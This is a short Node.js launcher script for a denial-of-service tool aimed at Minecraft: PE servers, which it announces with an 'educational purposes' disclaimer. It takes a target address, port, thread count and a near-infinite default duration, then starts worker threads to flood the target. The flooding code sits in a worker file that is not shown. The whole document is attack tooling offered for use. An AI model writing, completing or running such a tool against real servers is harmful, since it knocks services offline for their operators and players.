const { Worker } = require('worker_threads');

console.log(`ServerToqster script for ddosing Minecraft: PE Servers just to inform you this is for educational purposes, use it in your own risk!`)

const [node, dir, address, port, threads = 4, time = 999999999999999999999999999999999999999999999999999999999999999999999999999] = process.argv;

if (!address || !port) {
  return console.log('[ERROR] Use: \'node . <address> <port> [<threads> (default 4)] [<time> (in minutes)]\'')
}

for (let i = 0; i < threads; i++) {
  console.log(`[ServerServerToqster] Starting thread #${i}...`)

  const worker = new Worker('./worker.js');
  worker.postMessage({
    address,
    port,
    time,
    thread: i
  });
}

console.log("[ServerToqster] Toasting the server in 3 seconds...")